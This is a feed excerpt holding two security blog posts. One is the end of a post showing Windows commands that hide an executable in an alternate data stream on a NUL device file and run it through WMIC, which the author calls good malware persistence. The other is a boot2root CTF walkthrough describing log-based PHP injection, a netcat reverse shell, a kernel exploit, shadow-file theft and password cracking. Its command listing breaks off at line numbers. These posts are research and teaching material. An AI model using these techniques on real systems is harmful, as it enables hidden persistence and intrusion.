"\\.\GLOBALROOT\Device\HarddiskVolume[n]\" is appended. Subsequently, this is also the only way to delete the file.&lt;br /&gt;&lt;br /&gt;This technique has been known about for over a year now and is well documented[&lt;a href="http://www.exploit-monday.com/feeds/posts/default#8_2"&gt;2&lt;/a&gt;][&lt;a href="http://www.exploit-monday.com/feeds/posts/default#8_3"&gt;3&lt;/a&gt;].&lt;br /&gt;&lt;br /&gt;What I found to be interesting is that when you create an alternate data stream that is attached to a file named after any reserved device name, the alternate data stream is invisible to both 'dir /R' and streams.exe unless you append the "\\?\" prefix to the path. Also, if the ADS happens to be an executable, it can be executed using WMIC. As an example:&lt;/div&gt;&lt;br /&gt;&lt;span&gt;C:\temp&amp;gt;type C:\Windows\System32\cmd.exe &amp;gt; \\?\C:\temp\NUL:hidden_ADS.exe&lt;/span&gt;&lt;br /&gt;&lt;br /&gt;&lt;span&gt;C:\temp&amp;gt;dir /r C:\temp&lt;/span&gt;&lt;br /&gt;&lt;br /&gt;&lt;span&gt;&amp;nbsp;Directory of C:\temp&lt;/span&gt;&lt;br /&gt;&lt;br /&gt;&lt;span&gt;09/17/2011&amp;nbsp; 06:35 AM&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;DIR&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; .&lt;/span&gt;&lt;br /&gt;&lt;span&gt;09/17/2011&amp;nbsp; 06:35 AM&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;DIR&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ..&lt;/span&gt;&lt;br /&gt;&lt;span&gt;09/17/2011&amp;nbsp; 06:37 AM&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 5 NUL&lt;/span&gt;&lt;br /&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 1 File(s)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 5 bytes&lt;/span&gt;&lt;br /&gt;&lt;br /&gt;&lt;span&gt;C:\temp&amp;gt;streams C:\temp&lt;/span&gt;&lt;br /&gt;&lt;br /&gt;&lt;span&gt;Streams v1.56 - Enumerate alternate NTFS data streams&lt;/span&gt;&lt;br /&gt;&lt;span&gt;Copyright (C) 1999-2007 Mark Russinovich&lt;/span&gt;&lt;br /&gt;&lt;span&gt;Sysinternals - www.sysinternals.com&lt;/span&gt;&lt;br /&gt;&lt;br /&gt;&lt;span&gt;No files with streams found.&lt;/span&gt;&lt;br /&gt;&lt;br /&gt;&lt;span&gt;C:\temp&amp;gt;wmic process call create \\?\C:\temp\NUL:hidden_ADS.exe&lt;/span&gt;&lt;br /&gt;&lt;span&gt;Executing (Win32_Process)-&amp;gt;Create()&lt;/span&gt;&lt;br /&gt;&lt;span&gt;Method execution successful.&lt;/span&gt;&lt;br /&gt;&lt;span&gt;Out Parameters:&lt;/span&gt;&lt;br /&gt;&lt;span&gt;instance of __PARAMETERS&lt;/span&gt;&lt;br /&gt;&lt;span&gt;{&lt;/span&gt;&lt;br /&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ProcessId = 1620;&lt;/span&gt;&lt;br /&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ReturnValue = 0;&lt;/span&gt;&lt;br /&gt;&lt;span&gt;};&lt;/span&gt;&lt;br /&gt;&lt;br /&gt;&lt;div class="separator" style="clear: both; text-align: center;"&gt;&lt;a href="http://4.bp.blogspot.com/-kUsjHsswmv8/TniRGrpItcI/AAAAAAAAACE/cAI5JY7nh04/s1600/hiddenADS.png" style="margin-left: 1em; margin-right: 1em;"&gt;&lt;img border="0" height="171" src="http://4.bp.blogspot.com/-kUsjHsswmv8/TniRGrpItcI/AAAAAAAAACE/cAI5JY7nh04/s400/hiddenADS.png" width="400" /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;So what are the implications of this?&lt;br /&gt;&lt;br /&gt;&lt;div style="text-align: justify;"&gt;1) You have a file that's nearly impossible to delete unless you know to append '\\?\'&lt;br /&gt;2) You can hide malicious files/executables within the device name file in an ADS that is undetectable using traditional tools.&lt;br /&gt;3) If an executable is hidden in the invisible ADS, it can be executed via WMIC.&lt;br /&gt;&lt;br /&gt;As an added comment, according to the same MSDN article: "characters whose integer representations are in the range from 1 through 31, except for alternate data streams where these characters are allowed." This would allow someone to create an ADS using alt-characters. As an example:&lt;/div&gt;&lt;br /&gt;&lt;span&gt;C:\temp&amp;gt;echo hi &amp;gt; C:\temp\test.txt&lt;/span&gt;&lt;br /&gt;&lt;br /&gt;&lt;span&gt;C:\temp&amp;gt;echo secret text &amp;gt; C:\temp\test.txt:^G^G^G&lt;/span&gt;&lt;br /&gt;&lt;br /&gt;&lt;span&gt;C:\temp&amp;gt;dir /R C:\temp&lt;/span&gt;&lt;br /&gt;&lt;br /&gt;&lt;span&gt;&amp;nbsp;Directory of C:\temp&lt;/span&gt;&lt;br /&gt;&lt;br /&gt;&lt;span&gt;09/17/2011&amp;nbsp; 07:09 AM&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;DIR&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; .&lt;/span&gt;&lt;br /&gt;&lt;span&gt;09/17/2011&amp;nbsp; 07:09 AM&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;DIR&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ..&lt;/span&gt;&lt;br /&gt;&lt;span&gt;09/17/2011&amp;nbsp; 07:08 AM&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 5 test.txt&lt;/span&gt;&lt;br /&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 14 test.txt::$DATA&lt;/span&gt;&lt;br /&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 1 File(s)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 5 bytes&lt;/span&gt;&lt;br /&gt;&lt;br /&gt;&lt;span&gt;C:\temp&amp;gt;more &amp;lt; C:\temp\test.txt:^G^G^G&lt;/span&gt;&lt;br /&gt;&lt;span&gt;secret text&lt;/span&gt;&lt;br /&gt;&lt;br /&gt;The ADS is named after three system bell characters &amp;lt;ALT+007&amp;gt;. Therefore, nothing is printed but a directory listing would yield three audible beeps. Hehe. Nothing mind-blowing but just another way to mess with admins or incident handlers.&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style="text-align: center;"&gt;&lt;a href="http://2.bp.blogspot.com/-LaMChda7vBY/TniQY4VVpDI/AAAAAAAAACA/wk5at9vKSd4/s1600/smiley.png" style="margin-left: auto; margin-right: auto;"&gt;&lt;img border="0" src="http://2.bp.blogspot.com/-LaMChda7vBY/TniQY4VVpDI/AAAAAAAAACA/wk5at9vKSd4/s1600/smiley.png" /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class="tr-caption" style="text-align: center;"&gt;Happy ADS created using &amp;lt;ALT-002&amp;gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;br /&gt;The bottom line: these techniques would serve as both a good malware persistence mechanism and serve to frustrate any incident handler.&lt;br /&gt;&lt;br /&gt;&lt;a name="8_1"&gt;&lt;/a&gt;1. Microsoft, "Naming Files, Paths, and Namespaces", &lt;a href="http://msdn.microsoft.com/en-us/library/aa365247(VS.85).aspx"&gt;http://msdn.microsoft.com/en-us/library/aa365247(VS.85).aspx&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;&lt;a name="8_2"&gt;&lt;/a&gt;2. Dan Crowley, "Windows File Pseudonyms," April 2010, &lt;a href="http://www.sourceconference.com/publications/bos10pubs/Windows%20File%20Pseudonyms.pptx"&gt;http://www.sourceconference.com/publications/bos10pubs/Windows%20File%20Pseudonyms.pptx&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;&lt;a name="8_3"&gt;&lt;/a&gt;3. Mark Baggett, "NOT A CON!!!! (it's a backdoor)," February, 15 2010, &lt;a href="http://pauldotcom.com/2010/02/deleting-the-undeleteable.html"&gt;http://pauldotcom.com/2010/02/deleting-the-undeleteable.html&lt;/a&gt;&lt;div class="blogger-post-footer"&gt;&lt;img alt="" height="1" src="https://blogger.googleusercontent.com/tracker/6052198192158185644-3478590721505682921?l=exploit-monday.com" width="1" /&gt;&lt;/div&gt;</description><pubDate>Tue, 20 Sep 2011 13:25:00 +0000</pubDate></item><item><title>21LTR - Scene 1</title><link>https://blog.g0tmi1k.com/2012/09/21ltr-scene-1/</link><description>&lt;p&gt;&lt;a href="https://blog.g0tmi1k.com/categories/21ltr/"&gt;21ltr&lt;/a&gt; is another &lt;a href="https://blog.g0tmi1k.com/categories/boot2root/"&gt;boot2root&lt;/a&gt; collection, with its own unique twist. It has various 'issues' with the operating system, which have been purposely put in place to make it &lt;a href="https://blog.g0tmi1k.com/2011/03/vulnerable-by-design/"&gt;vulnerable by design&lt;/a&gt;. The end goal is to become the '&lt;em&gt;super user&lt;/em&gt;' of the system &lt;em&gt;(aka 'root')&lt;/em&gt;. There is an optional stage afterwards, in which the user can try and find the '&lt;em&gt;flag&lt;/em&gt;', proving &lt;em&gt;(to themselves)&lt;/em&gt; that they successfully completed it.&lt;/p&gt;

&lt;p&gt;&lt;img alt="21ltr Logo" class="center" height="155" src="https://blog.g0tmi1k.com/images/21ltr.png" title="21ltr" width="326" /&gt;&lt;/p&gt;

&lt;!--more--&gt;




&lt;div id="tocBlock"&gt;
&lt;span class="tocHeading"&gt;Table of Contents&lt;/span&gt;
&lt;ul&gt;
 &lt;li&gt;
 &lt;ul&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Links"&gt;Links&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Method"&gt;Method&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Tools"&gt;Tools&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Walkthrough"&gt;Walkthrough&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Commands"&gt;Commands&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Notes"&gt;Notes&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
&lt;/ul&gt;


&lt;/div&gt;


&lt;a name="Links"&gt;&lt;/a&gt;
&lt;h2&gt;Links&lt;/h2&gt;

&lt;p&gt;Watch video on-line: &lt;video controls="controls" height="432" poster="https://blog.g0tmi1k.com/atom.xml" preload="none" width="576"&gt;&lt;source src="http://download.g0tmi1k.com/videos_archive/21LTR_-_Scene_1.mp4" /&gt;&lt;/video&gt;&lt;/p&gt;

&lt;p&gt;Download video: &lt;a href="http://download.g0tmi1k.com/videos_archive/21LTR_-_Scene_1.mp4"&gt;http://download.g0tmi1k.com/videos_archive/21LTR&lt;em&gt;-&lt;/em&gt;Scene_1.mp4&lt;/a&gt;&lt;/p&gt;

&lt;a name="Method"&gt;&lt;/a&gt;
&lt;h2&gt;Method&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Scanned the network to locate the target [Net Discover]&lt;/li&gt;
&lt;li&gt;Port scanned the target to discover services [Unicorn Scan]&lt;/li&gt;
&lt;li&gt;Banner grabbed the services running on the open port(s) [NMap]&lt;/li&gt;
&lt;li&gt;Interacted with the web server by testing the default page, then brute forced to discover folders &amp;amp; files in the web root [Firefox &amp;amp; DirB]&lt;/li&gt;
&lt;li&gt;Cloned the FTP root folder with credentials learned from the web service [ftp]&lt;/li&gt;
&lt;li&gt;Analysed the 'loot' collected from the FTP service, in which to locate an additional file positioned on the web server [grep &amp;amp; cURL]&lt;/li&gt;
&lt;li&gt;Impersonated 'Dev Server Backup', and waited for the target to communicate to the attacker using the information collected from the FTP &amp;amp; Web services [Unicorn Scan &amp;amp; IPTables &amp;amp; NetCat]&lt;/li&gt;
&lt;li&gt;Injected a PHP payload into the backup logs, creating a backdoor into the system [Netcat &amp;amp; WebHandler]&lt;/li&gt;
&lt;li&gt;Discovered unprotected SSH credentials, which, as it turns out are for a 'privileged' account&lt;/li&gt;
&lt;li&gt;Used a kernel exploit to modify a restricted file to view what additional functions the wheel group can execute [UDEV]&lt;/li&gt;
&lt;li&gt;Downloaded the user credentials for the operating system and brute forced the passwords [John The Ripper]&lt;/li&gt;
&lt;li&gt;Remote logged back into the system via SSH and logged in with valid credentials for the super user&lt;/li&gt;
&lt;li&gt;Discovered the flag in a different user's home folder, which has been deleted but not yet, removed from the operating system&lt;/li&gt;
&lt;li&gt;Explored the 'backup service' which was also triggered at the same time as the log port.&lt;/li&gt;
&lt;/ul&gt;


&lt;a name="Tools"&gt;&lt;/a&gt;
&lt;h2&gt;Tools&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="http://21ltr.com/scenes/"&gt;21LTR.com_Scene1_2.120_v1.0.iso&lt;/a&gt; &lt;em&gt;(md5: c57d2b39cdf1216300d078eed88f24cb)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;A virtual machine &lt;em&gt;(Example: &lt;a href="http://www.filehippo.com/download_vmware_player/"&gt;VMware Player&lt;/a&gt; or &lt;a href="http://www.filehippo.com/download_virtualbox/"&gt;Virtual Box&lt;/a&gt;)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Net Discover - &lt;em&gt;(Can be found in &lt;a href="http://www.backtrack-linux.org/downloads/"&gt;BackTrack 5&lt;/a&gt;)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Unicorn Scan - &lt;em&gt;(Can be found in BackTrack 5)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;NMap - &lt;em&gt;(Can be found in BackTrack 5)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Firefox - &lt;em&gt;(Can be found in BackTrack 5)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;DirB - &lt;em&gt;(Can be found in BackTrack 5)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;FTP - &lt;em&gt;(Can be found in BackTrack 5)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;cURL - &lt;em&gt;(Can be found in BackTrack 5)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Netcat - &lt;em&gt;(Can be found in BackTrack 5)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;WebHandler - &lt;em&gt;(Can be found in BackTrack 5)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;UDEV Exploit - &lt;em&gt;(Can be found in BackTrack 5)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;John The Ripper - &lt;em&gt;(Can be found in BackTrack 5)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;darkc0de.lst - &lt;em&gt;(Can be found in BackTrack 5)&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;a name="Walkthrough"&gt;&lt;/a&gt;
&lt;h2&gt;Walkthrough&lt;/h2&gt;

&lt;p&gt;The README of this challenge gave the attacker the scope of the attack as well as the network configuration (the target is using a static IP address). By using "Netdiscover", the attacker was able to confirm that the target is located in a different IP range from themselves (192.168.2.x).&lt;/p&gt;

&lt;p&gt;After moving to the new IP range, the attacker port scans the selected target, which reveals any services that are running on open ports. By using "UnicornScan", it displays that there are only three open ports; TCP 21 (FTP), TCP 22 (SSH), TCP 80 (HTTP). The attacker checks Unicorn Scan's results by using "Nmap", but only scanning for TCP services. Nmap confirms the same result as before, however, the attacker uses nmap scripting engine to start emulating the services, allowing for the attacker to collect more information on the target. FTP primary function is for transferring files, SSH is used to remotely control the machine and HTTP is used to display web applications. SSH normally requires some form of credentials with which to use the service, whereas FTP can allow for anonymous usage; it is much more common for a web service to allow anyone to interact with it. Using this, the attacker views the default web page on the target's machine, using a graphical web browser, "firefox", to render the page's output.&lt;/p&gt;

&lt;p&gt;By looking through the source code which is displayed to them, the attacker notices that hidden away from the displayed view are comments in the code, which appear to be a username and password.&lt;/p&gt;

&lt;p&gt;The attacker keeps pursuing the web service, with the aid of "DirB". Once DirB is running, it will try and connect to all the combinations of folders and pages in a wordlist on the target's web service, and display the results. This allows for pages to be exposed that normally wouldn't be, unless the address is known (e.g. there aren't any hyperlinks pointing to the pages). One of the results from the default wordlist matches the username which was discovered in the source code from before. DirB reported when it tried to access the folder and the web server responded with "403", meaning it doesn't have permission to access that folder for a certain reason. The attacker repeats the same request, however, this time uses curl to access the page. The error message doesn't exactly say why they are not allowed to access the page. The attacker knows this could be for multiple reasons, for example; not authenticated, missing an index file and directory listing is disabled, file permissions on the web server etc.&lt;/p&gt;

&lt;p&gt;As the attacker has seen multiple occurrences of the word 'logs' (e.g. in the web page's source code, hinting at a username, plus it's the name of the hidden web folder), the attacker tries the credentials for the FTP service. The consequence of using it is that it has logged the attacker into the FTP service, to display a single file, which the attacker downloads. Accessing the file offline, the attacker understands that the file is for 'Intranet Dev Server Backup Log'. The code itself contains PHP tags plus looking at the file extension, the attacker spots that the server could have PHP installed.&lt;/p&gt;

&lt;p&gt;As there was only one file inside the ftp folder, a reason why the hidden web folder was returning 403, could be there isn't an 'index' page to display once inside the sub directory. The attacker goes back to the cURL which they made before and amends the filename that was downloaded. This time, the request displays the source code to the page, after it has been processed on the server. This means that:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;The file requested was valid (so the attacker has discovered a 'hidden' file in the hidden folder)&lt;/li&gt;
&lt;li&gt;The attacker could have the source code for the file (The files might be different!)&lt;/li&gt;
&lt;li&gt;If it is the same, then it appears PHP is successfully installed and is able to process code&lt;/li&gt;
&lt;li&gt;The ftp folder could be inside the web folder&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;The attacker now looks at the web page, and makes a note of a few things:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;It's a log page for the backup system (Web page title)&lt;/li&gt;
&lt;li&gt;It's not reading any values, therefore a different process has to update the log file (FTP offline file)&lt;/li&gt;
&lt;li&gt;In the error log, the IP address is 'static' (192.168.2.240)&lt;/li&gt;
&lt;li&gt;When the errors happen in the logs, the time has a pattern (7 requests, all happen at "something-one" minute). Therefore is there a scheduled event?&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;Using the information above, the attacker changes their IP address to match the one that was displayed on the page as well as continuously port scanning the target. After waiting a while and monitoring the port scan results, the attacker notices that a port opens up after a while (Editor's note: You'll never have to wait more than 10 minute)! The attacker then stops the looped port scanner and starts to continuously trying to connect to the new port, TCP: 10001, for when it is to open again. By using 'Netcat' the attacker is able to create a RAW socket, thus allowing them to interact to any service that is running. Therefore, there will not be a clash/mix in incorrect services as it is unknown.&lt;/p&gt;

&lt;p&gt;As the attacker is waiting to see if the port will open up again, they think to themselves 'If there is a service opening up, possibly for backing up, which is waiting for some form of activity, maybe it is creating activity also, by trying to attempt to connect out.' The attacker then starts to log if any TCP or UDP connections are made to them.&lt;/p&gt;

&lt;p&gt;After waiting a while, the port opens up again on the target, and there is a new event in the log file, also relating back to the target as the source address. The attacker sets up a listener to monitor the requested port and to capture all the data which will be sent to it. They place this aside for the moment (Editor's note: I'll come back to this at the end of the write up). The attacker goes to the open raw connection to the target and enters '?', which is a common command for help. However, remote service didn't response, but kept the connection open.&lt;/p&gt;

&lt;p&gt;The attacker now has a couple of options: try the SSH service, or, go back to either the HTTP or FTP service, to see if they missed anything 'hidden'. As SSH is more secure than FTP and allows the use of 'keys', looking at the complex FTP password the attacker believes that the target would use such authentication, thus has this lower down on the priority. This is also the same reason why they didn't try and brute force the FTP login. This means searching the web service again, trying to find something else hidden, exploiting the services or fuzzing the mysterious port. The attacker didn't notice any other clues/hints left for any 'hidden' gems, and currently there are not any public exploits for the versions of the software which is running on the target. As the unidentified service running didn't display a banner or response to the attacker's request, identifying the protocol in order to fuzz would be time consulting. Plus, having the port open once every ten minutes for a single connection dynamically increases the possible time required for fuzzing. The only bit of information regarding the service the attacker has collected, was the port number, which they could try to lookup what default service(s) uses it, however this a very weak link as port numbers can easily be altered. So without local access to the system or source code, the attacker believed that it would be extremely difficult to locate a vulnerability in this unknown service. This leaves going back to the HTTP service.&lt;/p&gt;

&lt;p&gt;The attacker starts repeating the same requests as before, to see if they missed anything. However, upon requesting the backup log page, the attacker notices a "?" at the end of the file, which wasn't there before. As this matches the value that was sent over the open port, the attacker attempts to send some PHP code that allows for requested values to be executed locally as commands on the system. After trying a simple command to identity who the current user is logged in as, the attacker notices that the returned page contains a new value. The attacker now cuts off the top of the log page, and as a result, has a very basic method of executing commands and displaying the result. The attacker then tries to improve the current interaction by gaining a better method to execute commands. The attacker searches for 'netcat' on the target's machines and discovers that it has it installed along with the location of the file. The attacker then locally setup a netcat listener to capture a connection, then causes the remote machine to connect back to the attacker and to execute a bash shell afterwards. The attacker now has a remote access into the target's system and is able to execute commands. However, the shell that they are using to listen with is non-tty, which limits their actions. The attacker can improve this by replacing their local listening netcat with 'webhandler' listening in its place. The attacker demonstrates the improvement of webhandler over netcat by showing webhandler responses, just like terminal and an SSH connection, with the arrows on the keyboard. After reconnecting again, this time with the terminal window re-drawn, the attacker starts to explore the target's file system.&lt;/p&gt;

&lt;p&gt;Inside the "/media" folder, the attacker notices that there is a USB stick plugged in (editor's note: this has been emulated by 21ltr) and along with a few PDF files, the attacker spots what possibly could be an SSH private key. The attacker opens up the files, in which appears to be a valid SSH private key along with the username to whom it belongs. The attacker downloads the file locally to their machines and prepares the file so it can be used.&lt;/p&gt;

&lt;p&gt;When the attacker interacts with the SSH service, with the SSH key and username gained from the USB stick, they discover they now have access into the system as another user. When checking to confirm which user they are logged in as, the attacker notices that the user account they are using is also a part of the 'wheel' group. The attacker is aware this user group often allows for 'extra' system privileges that 'normal' users are unable to perform. After confirming that this group has a certain amount of 'additional' privileges, the attacker sets out to discover which restricted commands they are able to execute. Instead of trying all the commands and comparing the values, the attacker tries to open the file which is responsible for the privileges of command execution as another user. However, they are displayed with a message, saying they are not allowed to view it. So the attacker has the ability to possibly execute a privilege command, but they are not aware of what the command is.&lt;/p&gt;

&lt;p&gt;The attacker checks the kernel version of the operating system as this is a common method of escape privileges. After matching up the version from 'exploit-db' which is a public database of exploits, the attacker tries the UDEV, which affects multiple versions of Linux kernels, that executes a command as the super user, root. The attacker checks the exploit code to make sure it's valid and will compile without editing. Then they see if the target machine has a c compiler, gcc installed locally on it, which it doesn't. This means they will have to compile locally and transfer it to the target (cross compiling). After compiling it locally and checking the status of the output, the attacker checks the source code for instructions to successfully execute the exploit. After transferring the exploit to the target's machine, using secure copy (which has been enabled on the SSH service), the attacker creates the file that will be executed as the super user. The attacker then crafts a payload to change the file permission of the sudoers file, which will allows anyone to read it (as well as write!), which they were trying to access before, but failed. (Editor's note: I could have skipped out the following stage and gone straight to the shadow file - however, I wanted to demonstrate the power of the wheel group, along with its 'flaws').&lt;/p&gt;

&lt;p&gt;When the attacker tries to read the same file as before, this time the attacker is allowed, as the UDEV exploit ran (allowing anyone to access that file). The attacker notices that if they are to use "sudo cat", whoever is in the wheel group, is able to access any file which the super user would be able to, without being prompted for a password (which the attacker doesn't know, as they are using the SSH key to gain access)! The attacker now tries to use the information that they just acquired, to read the shadow file, which normally contains the credentials for every user account on the system, which is normally only accessible to the super user. However, upon requesting access to the file, the command fails, due to incorrect permissions of the sudoers file - which is a security protection. The attacker then updates the udev payload, to modify the file permissions back to how they were before the exploit was first executed. This time, when the attacker tries to open the password file, they are presented with the contents of the file. The attacker now breaks out of the SSH connection, and executes the SSH connection once more, however, this time, only to execute a single SSH command and to pipe the output into a file. The attacker uses the same command in which to view the password file, thus they are able to transfer the target's password to their machine.&lt;/p&gt;

&lt;p&gt;Now the attacker is able to try and brute force the target's passwords offline by using 'John The Ripper'. After the first basic attempt of trying to crack the password hashes, the attacker discovers the super user's password, "forumula1".&lt;/p&gt;

&lt;p&gt;The attacker once again connects back to the target's system by using SSH, and switches users to the super user. When they are prompted for the password, they use the value from John The Ripper, and they are now the super user.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Game Over&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The attacker then starts exploring the file system, as they now have complete access in the system. They move to the other user's home folder, and list the contents of every sub folder in it. They spot an 'interesting' file name, 'payroll', in one of the user's account trash bin, where they have deleted it, but haven't yet removed it from the system. This allows the attacker to display the contents of the file.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Game Over...&lt;em&gt;again&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The attacker then goes back to the listening netcat, where they were waiting for the 'mysterious port' to open (which they now know is meant for the use of the backup server to echo their response into the log file). Since performing the attack on the target, the connection has closed. The attacker then uses 'file' to check the file header of the output data collected, and discovers that the data recovered was a compressed archive. After extracting the file, there was only a single file, which was also compressed, however, in a different compression format. Once the second archive was extracted, the filename of the archive along with the extracted files, identified that the service which made the connection from the target to the attacker was "PXELINUX", which is used to boot Linux from a network server.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Game Over...&lt;em&gt;again...again&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;a name="Commands"&gt;&lt;/a&gt;
&lt;h2&gt;Commands&lt;/h2&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;span class="line-number"&gt;20&lt;/span&gt;
&lt;span class="line-number"&gt;21&lt;/span&gt;
&lt;span class="line-number"&gt;22&lt;/span&gt;
&lt;span class="line-number"&gt;23&lt;/span&gt;
&lt;span class="line-number"&gt;24&lt;/span&gt;
&lt;span class="line-number"&gt;25&lt;/span&gt;
&lt;span class="line-number"&gt;26&lt;/span&gt;
&lt;span class="line-number"&gt;27&lt;/span&gt;
&lt;span class="line-number"&gt;28&lt;/span&gt;
&lt;span class="line-number"&gt;29&lt;/span&gt;
&lt;span class="line-number"&gt;30&lt;/span&gt;
